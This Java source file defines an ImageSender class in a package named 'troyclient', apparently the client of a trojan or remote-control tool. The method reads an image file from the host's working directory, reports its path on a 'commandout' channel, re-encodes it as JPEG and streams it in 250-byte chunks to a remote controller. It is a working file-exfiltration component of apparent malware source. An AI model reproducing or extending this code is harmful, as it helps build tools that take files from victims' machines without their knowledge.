package ch.lebois.troyclient.service;


import ch.lebois.troyclient.main.GetContext;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import javax.imageio.ImageIO;

/**
 * @PROJECT Hermann
 */
public class ImageSender {

    public byte[] sendBytes(String path) {
        BufferedImage bufferedImage;
        byte[] bytes;
        try {
            String fullPath = System.getProperty("user.dir") + "/" + path;
            GetContext.SENDER.send("commandout", fullPath);

            bufferedImage = ImageIO.read(new File(fullPath));

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ImageIO.write(bufferedImage, "jpg", byteArrayOutputStream);
            byteArrayOutputStream.flush();

            bytes = byteArrayOutputStream.toByteArray();
            GetContext.SENDER.send("imgSize", String.valueOf(bytes.length));
            byteArrayOutputStream.close();

            StringBuilder byteHandler = new StringBuilder();
            int maxbytes = 250;
            for (byte b : bytes) {
                maxbytes--;
                byteHandler.append(b);
                byteHandler.append("_");
                if (maxbytes == 0) {
                    maxbytes = 250;
                    GetContext.SENDER.send("img", String.valueOf(byteHandler));
                    byteHandler = new StringBuilder();
                }
            }
            GetContext.SENDER.send("imgend", "");

            return bytes;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }


}
